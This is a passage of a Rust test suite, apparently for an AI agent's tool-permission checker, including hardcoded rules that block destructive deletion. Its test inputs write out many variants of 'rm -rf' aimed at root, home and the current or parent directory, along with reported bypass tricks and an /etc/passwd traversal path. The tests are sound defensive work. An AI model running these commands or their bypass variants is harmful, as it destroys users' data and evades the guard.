        t("echo $(cat $(whoami).txt)")
            .allow(&["^echo", "^cat", "^whoami"])
            .is_allow();
    }

    #[test]
    fn parse_failure_falls_back_to_confirm() {
        t("ls &&").allow(&["^ls$"]).is_confirm();
    }

    #[test]
    fn mcp_tool_default_modes() {
        t("")
            .tool("mcp:fs:read")
            .mode(ToolPermissionMode::Allow)
            .is_allow();
        t("")
            .tool("mcp:bad:del")
            .mode(ToolPermissionMode::Deny)
            .is_deny();
        t("")
            .tool("mcp:gh:issue")
            .mode(ToolPermissionMode::Confirm)
            .is_confirm();
        t("")
            .tool("mcp:gh:issue")
            .mode(ToolPermissionMode::Confirm)
            .global(true)
            .is_allow();
    }

    #[test]
    fn mcp_doesnt_collide_with_builtin() {
        let mut tools = collections::HashMap::default();
        tools.insert(
            Arc::from(TerminalTool::NAME),
            ToolRules {
                default_mode: ToolPermissionMode::Deny,
                always_allow: vec![],
                always_deny: vec![],
                always_confirm: vec![],
                invalid_patterns: vec![],
            },
        );
        tools.insert(
            Arc::from("mcp:srv:terminal"),
            ToolRules {
                default_mode: ToolPermissionMode::Allow,
                always_allow: vec![],
                always_deny: vec![],
                always_confirm: vec![],
                invalid_patterns: vec![],
            },
        );
        let p = ToolPermissions { tools };
        assert!(matches!(
            ToolPermissionDecision::from_input(
                TerminalTool::NAME,
                "x",
                &p,
                false,
                ShellKind::Posix
            ),
            ToolPermissionDecision::Deny(_)
        ));
        assert_eq!(
            ToolPermissionDecision::from_input(
                "mcp:srv:terminal",
                "x",
                &p,
                false,
                ShellKind::Posix
            ),
            ToolPermissionDecision::Allow
        );
    }

    #[test]
    fn case_insensitive_by_default() {
        t("CARGO TEST").allow(&[pattern("cargo")]).is_allow();
        t("Cargo Test").allow(&[pattern("cargo")]).is_allow();
    }

    #[test]
    fn case_sensitive_allow() {
        t("cargo test")
            .allow_case_sensitive(&[pattern("cargo")])
            .is_allow();
        t("CARGO TEST")
            .allow_case_sensitive(&[pattern("cargo")])
            .is_confirm();
    }

    #[test]
    fn case_sensitive_deny() {
        t("rm -rf ./temp")
            .deny_case_sensitive(&[pattern("rm")])
            .is_deny();
        t("RM -RF ./temp")
            .deny_case_sensitive(&[pattern("rm")])
            .mode(ToolPermissionMode::Allow)
            .is_allow();
    }

    #[test]
    fn nushell_allows_with_allow_pattern() {
        t("ls").allow(&["^ls"]).shell(ShellKind::Nushell).is_allow();
    }

    #[test]
    fn nushell_allows_deny_patterns() {
        t("rm -rf ./temp")
            .deny(&["rm\\s+-rf"])
            .shell(ShellKind::Nushell)
            .is_deny();
    }

    #[test]
    fn nushell_allows_confirm_patterns() {
        t("sudo reboot")
            .confirm(&["sudo"])
            .shell(ShellKind::Nushell)
            .is_confirm();
    }

    #[test]
    fn nushell_no_allow_patterns_uses_default() {
        t("ls")
            .deny(&["rm"])
            .mode(ToolPermissionMode::Allow)
            .shell(ShellKind::Nushell)
            .is_allow();
    }

    #[test]
    fn elvish_allows_with_allow_pattern() {
        t("ls").allow(&["^ls"]).shell(ShellKind::Elvish).is_allow();
    }

    #[test]
    fn rc_allows_with_allow_pattern() {
        t("ls").allow(&["^ls"]).shell(ShellKind::Rc).is_allow();
    }

    #[test]
    fn multiple_invalid_patterns_pluralizes_message() {
        let mut tools = collections::HashMap::default();
        tools.insert(
            Arc::from(TerminalTool::NAME),
            ToolRules {
                default_mode: ToolPermissionMode::Allow,
                always_allow: vec![],
                always_deny: vec![],
                always_confirm: vec![],
                invalid_patterns: vec![
                    InvalidRegexPattern {
                        pattern: "[bad1".into(),
                        rule_type: "always_deny".into(),
                        error: "err1".into(),
                    },
                    InvalidRegexPattern {
                        pattern: "[bad2".into(),
                        rule_type: "always_allow".into(),
                        error: "err2".into(),
                    },
                ],
            },
        );
        let p = ToolPermissions { tools };

        let result = ToolPermissionDecision::from_input(
            TerminalTool::NAME,
            "echo hi",
            &p,
            false,
            ShellKind::Posix,
        );
        match result {
            ToolPermissionDecision::Deny(msg) => {
                assert!(
                    msg.contains("2 regex patterns"),
                    "Expected '2 regex patterns' in message, got: {}",
                    msg
                );
            }
            other => panic!("Expected Deny, got {:?}", other),
        }
    }

    // Hardcoded security rules tests - these rules CANNOT be bypassed

    #[test]
    fn hardcoded_blocks_rm_rf_root() {
        t("rm -rf /").is_deny();
        t("rm -fr /").is_deny();
        t("rm -RF /").is_deny();
        t("rm -FR /").is_deny();
        t("rm -r -f /").is_deny();
        t("rm -f -r /").is_deny();
        t("RM -RF /").is_deny();
        // Long flags
        t("rm --recursive --force /").is_deny();
        t("rm --force --recursive /").is_deny();
        // Extra short flags
        t("rm -rfv /").is_deny();
        t("rm -v -rf /").is_deny();
        // Glob wildcards
        t("rm -rf /*").is_deny();
        t("rm -rf /* ").is_deny();
        // End-of-options marker
        t("rm -rf -- /").is_deny();
        t("rm -- /").is_deny();
        // Prefixed with sudo or other commands
        t("sudo rm -rf /").is_deny();
        t("sudo rm -rf /*").is_deny();
        t("sudo rm -rf --no-preserve-root /").is_deny();
    }

    #[test]
    fn hardcoded_blocks_rm_rf_home() {
        t("rm -rf ~").is_deny();
        t("rm -fr ~").is_deny();
        t("rm -rf ~/").is_deny();
        t("rm -rf $HOME").is_deny();
        t("rm -fr $HOME").is_deny();
        t("rm -rf $HOME/").is_deny();
        t("rm -rf ${HOME}").is_deny();
        t("rm -rf ${HOME}/").is_deny();
        t("rm -RF $HOME").is_deny();
        t("rm -FR ${HOME}/").is_deny();
        t("rm -R -F ${HOME}/").is_deny();
        t("RM -RF ~").is_deny();
        // Long flags
        t("rm --recursive --force ~").is_deny();
        t("rm --recursive --force ~/").is_deny();
        t("rm --recursive --force $HOME").is_deny();
        t("rm --force --recursive ${HOME}/").is_deny();
        // Extra short flags
        t("rm -rfv ~").is_deny();
        t("rm -v -rf ~/").is_deny();
        // Glob wildcards
        t("rm -rf ~/*").is_deny();
        t("rm -rf $HOME/*").is_deny();
        t("rm -rf ${HOME}/*").is_deny();
        // End-of-options marker
        t("rm -rf -- ~").is_deny();
        t("rm -rf -- ~/").is_deny();
        t("rm -rf -- $HOME").is_deny();
    }

    #[test]
    fn hardcoded_blocks_rm_rf_home_with_traversal() {
        // Path traversal after $HOME / ${HOME} should still be blocked
        t("rm -rf $HOME/./").is_deny();
        t("rm -rf $HOME/foo/..").is_deny();
        t("rm -rf ${HOME}/.").is_deny();
        t("rm -rf ${HOME}/./").is_deny();
        t("rm -rf $HOME/a/b/../..").is_deny();
        t("rm -rf ${HOME}/foo/bar/../..").is_deny();
        // Subdirectories should NOT be blocked
        t("rm -rf $HOME/subdir")
            .mode(ToolPermissionMode::Allow)
            .is_allow();
        t("rm -rf ${HOME}/Documents")
            .mode(ToolPermissionMode::Allow)
            .is_allow();
    }

    #[test]
    fn hardcoded_blocks_rm_rf_dot() {
        t("rm -rf .").is_deny();
        t("rm -fr .").is_deny();
        t("rm -rf ./").is_deny();
        t("rm -rf ..").is_deny();
        t("rm -fr ..").is_deny();
        t("rm -rf ../").is_deny();
        t("rm -RF .").is_deny();
        t("rm -FR ../").is_deny();
        t("rm -R -F ../").is_deny();
        t("RM -RF .").is_deny();
        t("RM -RF ..").is_deny();
        // Long flags
        t("rm --recursive --force .").is_deny();
        t("rm --force --recursive ../").is_deny();
        // Extra short flags
        t("rm -rfv .").is_deny();
        t("rm -v -rf ../").is_deny();
        // Glob wildcards
        t("rm -rf ./*").is_deny();
        t("rm -rf ../*").is_deny();
        // End-of-options marker
        t("rm -rf -- .").is_deny();
        t("rm -rf -- ../").is_deny();
    }

    #[test]
    fn hardcoded_cannot_be_bypassed_by_global() {
        // Even with always_allow_tool_actions=true, hardcoded rules block
        t("rm -rf /").global(true).is_deny();
        t("rm -rf ~").global(true).is_deny();
        t("rm -rf $HOME").global(true).is_deny();
        t("rm -rf .").global(true).is_deny();
        t("rm -rf ..").global(true).is_deny();
    }

    #[test]
    fn hardcoded_cannot_be_bypassed_by_allow_pattern() {
        // Even with an allow pattern that matches, hardcoded rules block
        t("rm -rf /").allow(&[".*"]).is_deny();
        t("rm -rf $HOME").allow(&[".*"]).is_deny();
        t("rm -rf .").allow(&[".*"]).is_deny();
        t("rm -rf ..").allow(&[".*"]).is_deny();
    }

    #[test]
    fn hardcoded_allows_safe_rm() {
        // rm -rf on a specific path should NOT be blocked
        t("rm -rf ./build")
            .mode(ToolPermissionMode::Allow)
            .is_allow();
        t("rm -rf /tmp/test")
            .mode(ToolPermissionMode::Allow)
            .is_allow();
        t("rm -rf ~/Documents")
            .mode(ToolPermissionMode::Allow)
            .is_allow();
        t("rm -rf $HOME/Documents")
            .mode(ToolPermissionMode::Allow)
            .is_allow();
        t("rm -rf ../some_dir")
            .mode(ToolPermissionMode::Allow)
            .is_allow();
        t("rm -rf .hidden_dir")
            .mode(ToolPermissionMode::Allow)
            .is_allow();
    }

    #[test]
    fn hardcoded_checks_chained_commands() {
        // Hardcoded rules should catch dangerous commands in chains
        t("ls && rm -rf /").is_deny();
        t("echo hello; rm -rf ~").is_deny();
        t("cargo build && rm -rf /").global(true).is_deny();
        t("echo hello; rm -rf $HOME").is_deny();
        t("echo hello; rm -rf .").is_deny();
        t("echo hello; rm -rf ..").is_deny();
    }

    #[test]
    fn hardcoded_blocks_rm_with_trailing_flags() {
        // GNU rm accepts flags after operands by default
        t("rm / -rf").is_deny();
        t("rm / -fr").is_deny();
        t("rm / -RF").is_deny();
        t("rm / -r -f").is_deny();
        t("rm / --recursive --force").is_deny();
        t("rm / -rfv").is_deny();
        t("rm /* -rf").is_deny();
        // Mixed: some flags before path, some after
        t("rm -r / -f").is_deny();
        t("rm -f / -r").is_deny();
        // Home
        t("rm ~ -rf").is_deny();
        t("rm ~/ -rf").is_deny();
        t("rm ~ -r -f").is_deny();
        t("rm $HOME -rf").is_deny();
        t("rm ${HOME} -rf").is_deny();
        // Dot / dotdot
        t("rm . -rf").is_deny();
        t("rm ./ -rf").is_deny();
        t("rm . -r -f").is_deny();
        t("rm .. -rf").is_deny();
        t("rm ../ -rf").is_deny();
        t("rm .. -r -f").is_deny();
        // Trailing flags in chained commands
        t("ls && rm / -rf").is_deny();
        t("echo hello; rm ~ -rf").is_deny();
        // Safe paths with trailing flags should NOT be blocked
        t("rm ./build -rf")
            .mode(ToolPermissionMode::Allow)
            .is_allow();
        t("rm /tmp/test -rf")
            .mode(ToolPermissionMode::Allow)
            .is_allow();
        t("rm ~/Documents -rf")
            .mode(ToolPermissionMode::Allow)
            .is_allow();
    }

    #[test]
    fn hardcoded_blocks_rm_with_flag_equals_value() {
        // --flag=value syntax should not bypass the rules
        t("rm --no-preserve-root=yes -rf /").is_deny();
        t("rm --no-preserve-root=yes --recursive --force /").is_deny();
        t("rm -rf --no-preserve-root=yes /").is_deny();
        t("rm --interactive=never -rf /").is_deny();
        t("rm --no-preserve-root=yes -rf ~").is_deny();
        t("rm --no-preserve-root=yes -rf .").is_deny();
        t("rm --no-preserve-root=yes -rf ..").is_deny();
        t("rm --no-preserve-root=yes -rf $HOME").is_deny();
        // --flag (without =value) should also not bypass the rules
        t("rm -rf --no-preserve-root /").is_deny();
        t("rm --no-preserve-root -rf /").is_deny();
        t("rm --no-preserve-root --recursive --force /").is_deny();
        t("rm -rf --no-preserve-root ~").is_deny();
        t("rm -rf --no-preserve-root .").is_deny();
        t("rm -rf --no-preserve-root ..").is_deny();
        t("rm -rf --no-preserve-root $HOME").is_deny();
        // Trailing --flag=value after path
        t("rm / --no-preserve-root=yes -rf").is_deny();
        t("rm ~ -rf --no-preserve-root=yes").is_deny();
        // Trailing --flag (without =value) after path
        t("rm / -rf --no-preserve-root").is_deny();
        t("rm ~ -rf --no-preserve-root").is_deny();
        // Safe paths with --flag=value should NOT be blocked
        t("rm --no-preserve-root=yes -rf ./build")
            .mode(ToolPermissionMode::Allow)
            .is_allow();
        t("rm --interactive=never -rf /tmp/test")
            .mode(ToolPermissionMode::Allow)
            .is_allow();
        // Safe paths with --flag (without =value) should NOT be blocked
        t("rm --no-preserve-root -rf ./build")
            .mode(ToolPermissionMode::Allow)
            .is_allow();
    }

    #[test]
    fn hardcoded_blocks_rm_with_path_traversal() {
        // Traversal to root via ..
        t("rm -rf /etc/../").is_deny();
        t("rm -rf /tmp/../../").is_deny();
        t("rm -rf /tmp/../..").is_deny();
        t("rm -rf /var/log/../../").is_deny();
        // Root via /./
        t("rm -rf /./").is_deny();
        t("rm -rf /.").is_deny();
        // Double slash (equivalent to /)
        t("rm -rf //").is_deny();
        // Home traversal via ~/./
        t("rm -rf ~/./").is_deny();
        t("rm -rf ~/.").is_deny();
        // Dot traversal via indirect paths
        t("rm -rf ./foo/..").is_deny();
        t("rm -rf ../foo/..").is_deny();
        // Traversal in chained commands
        t("ls && rm -rf /tmp/../../").is_deny();
        t("echo hello; rm -rf /./").is_deny();
        // Traversal cannot be bypassed by global or allow patterns
        t("rm -rf /tmp/../../").global(true).is_deny();
        t("rm -rf /./").allow(&[".*"]).is_deny();
        // Safe paths with traversal should still be allowed
        t("rm -rf /tmp/../tmp/foo")
            .mode(ToolPermissionMode::Allow)
            .is_allow();
        t("rm -rf ~/Documents/./subdir")
            .mode(ToolPermissionMode::Allow)
            .is_allow();
    }

    #[test]
    fn hardcoded_blocks_rm_multi_path_with_dangerous_last() {
        t("rm -rf /tmp /").is_deny();
        t("rm -rf /tmp/foo /").is_deny();
        t("rm -rf /var/log ~").is_deny();
        t("rm -rf /safe $HOME").is_deny();
    }

    #[test]
    fn hardcoded_blocks_rm_multi_path_with_dangerous_first() {
        t("rm -rf / /tmp").is_deny();
        t("rm -rf ~ /var/log").is_deny();
        t("rm -rf . /tmp/foo").is_deny();
        t("rm -rf .. /safe").is_deny();
    }

    #[test]
    fn hardcoded_allows_rm_multi_path_all_safe() {
        t("rm -rf /tmp /home/user")
            .mode(ToolPermissionMode::Allow)
            .is_allow();
        t("rm -rf ./build ./dist")
            .mode(ToolPermissionMode::Allow)
            .is_allow();
        t("rm -rf /var/log/app /tmp/cache")
            .mode(ToolPermissionMode::Allow)
            .is_allow();
    }

    #[test]
    fn hardcoded_blocks_rm_multi_path_with_traversal() {
        t("rm -rf /safe /tmp/../../").is_deny();
        t("rm -rf /tmp/../../ /safe").is_deny();
        t("rm -rf /safe /var/log/../../").is_deny();
    }

    #[test]
    fn hardcoded_blocks_user_reported_bypass_variants() {
        // User report: "rm -rf /etc/../" normalizes to "rm -rf /" via path traversal
        t("rm -rf /etc/../").is_deny();
        t("rm -rf /etc/..").is_deny();
        // User report: --no-preserve-root (without =value) should not bypass
        t("rm -rf --no-preserve-root /").is_deny();
        t("rm --no-preserve-root -rf /").is_deny();
        // User report: "rm -rf /*" should be caught (glob expands to all top-level entries)
        t("rm -rf /*").is_deny();
        // Chained with sudo
        t("sudo rm -rf /").is_deny();
        t("sudo rm -rf --no-preserve-root /").is_deny();
        // Traversal cannot be bypassed even with global allow or allow patterns
        t("rm -rf /etc/../").global(true).is_deny();
        t("rm -rf /etc/../").allow(&[".*"]).is_deny();
        t("rm -rf --no-preserve-root /").global(true).is_deny();
        t("rm -rf --no-preserve-root /").allow(&[".*"]).is_deny();
    }

    #[test]
    fn normalize_path_relative_no_change() {
        assert_eq!(normalize_path("foo/bar"), "foo/bar");
    }

    #[test]
    fn normalize_path_relative_with_curdir() {
        assert_eq!(normalize_path("foo/./bar"), "foo/bar");
    }

    #[test]
    fn normalize_path_relative_with_parent() {
        assert_eq!(normalize_path("foo/bar/../baz"), "foo/baz");
    }

    #[test]
    fn normalize_path_absolute_preserved() {
        assert_eq!(normalize_path("/etc/passwd"), "/etc/passwd");
    }

    #[test]
    fn normalize_path_absolute_with_traversal() {
        assert_eq!(normalize_path("/tmp/../etc/passwd"), "/etc/passwd");
    }

    #[test]
    fn normalize_path_root() {
        assert_eq!(normalize_path("/"), "/");
    }

    #[test]
    fn normalize_path_parent_beyond_root_clamped() {
        assert_eq!(normalize_path("/../../../etc/passwd"), "/etc/passwd");
    }

    #[test]
    fn normalize_path_curdir_only() {
        assert_eq!(normalize_path("."), "");
    }

    #[test]
    fn normalize_path_empty() {
        assert_eq!(normalize_path(""), "");
    }

    #[test]
    fn normalize_path_relative_traversal_above_start() {
        assert_eq!(normalize_path("../../../etc/passwd"), "../../../etc/passwd");
    }

    #[test]
    fn normalize_path_relative_traversal_with_curdir() {
        assert_eq!(normalize_path("../../."), "../..");
    }

    #[test]
    fn normalize_path_relative_partial_traversal_above_start() {
        assert_eq!(normalize_path("foo/../../bar"), "../bar");
    }

    #[test]
    fn most_restrictive_deny_vs_allow() {
        assert!(matches!(
            most_restrictive(
                ToolPermissionDecision::Deny("x".into()),
                ToolPermissionDecision::Allow
            ),
            ToolPermissionDecision::Deny(_)
        ));
    }

    #[test]
    fn most_restrictive_allow_vs_deny() {
        assert!(matches!(
            most_restrictive(
                ToolPermissionDecision::Allow,
                ToolPermissionDecision::Deny("x".into())
            ),
            ToolPermissionDecision::Deny(_)
        ));
    }

    #[test]
    fn most_restrictive_deny_vs_confirm() {
        assert!(matches!(
            most_restrictive(
                ToolPermissionDecision::Deny("x".into()),
                ToolPermissionDecision::Confirm
            ),
            ToolPermissionDecision::Deny(_)
        ));
    }

    #[test]
    fn most_restrictive_confirm_vs_deny() {
        assert!(matches!(
            most_restrictive(
                ToolPermissionDecision::Confirm,
                ToolPermissionDecision::Deny("x".into())
            ),
            ToolPermissionDecision::Deny(_)
        ));
    }

    #[test]
    fn most_restrictive_deny_vs_deny() {
        assert!(matches!(
            most_restrictive(
                ToolPermissionDecision::Deny("a".into()),
                ToolPermissionDecision::Deny("b".into())
            ),
            ToolPermissionDecision::Deny(_)
        ));
    }

    #[test]
    fn most_restrictive_confirm_vs_allow() {
        assert_eq!(
            most_restrictive(
                ToolPermissionDecision::Confirm,
                ToolPermissionDecision::Allow
            ),
            ToolPermissionDecision::Confirm
        );
    }

    #[test]
    fn most_restrictive_allow_vs_confirm() {
        assert_eq!(
            most_restrictive(
                ToolPermissionDecision::Allow,
                ToolPermissionDecision::Confirm
            ),
            ToolPermissionDecision::Confirm
        );
    }

    #[test]
    fn most_restrictive_allow_vs_allow() {
        assert_eq!(
            most_restrictive(ToolPermissionDecision::Allow, ToolPermissionDecision::Allow),
            ToolPermissionDecision::Allow
        );
    }

    #[test]
    fn decide_permission_for_path_no_dots_early_return() {
        // When the path has no `.` or `..`, normalize_path returns the same string,
        // so decide_permission_for_path returns the raw decision directly.
        let settings = test_agent_settings(
            ToolPermissions {
                tools: Default::default(),
            },
            false,
        );
        let decision = decide_permission_for_path(EditFileTool::NAME, "src/main.rs", &settings);
        assert_eq!(decision, ToolPermissionDecision::Confirm);
    }

    #[test]
    fn decide_permission_for_path_traversal_triggers_deny() {
        let deny_regex = CompiledRegex::new("/etc/passwd", false).unwrap();
        let mut tools = collections::HashMap::default();
        tools.insert(
            Arc::from(EditFileTool::NAME),
            ToolRules {
                default_mode: ToolPermissionMode::Allow,
                always_allow: vec![],
                always_deny: vec![deny_regex],
                always_confirm: vec![],
                invalid_patterns: vec![],
            },
        );
        let settings = test_agent_settings(ToolPermissions { tools }, false);

        let decision =
            decide_permission_for_path(EditFileTool::NAME, "/tmp/../etc/passwd", &settings);
        assert!(
            matches!(decision, ToolPermissionDecision::Deny(_)),
            "expected Deny for traversal to /etc/passwd, got {:?}",
            decision
        );
    }
}
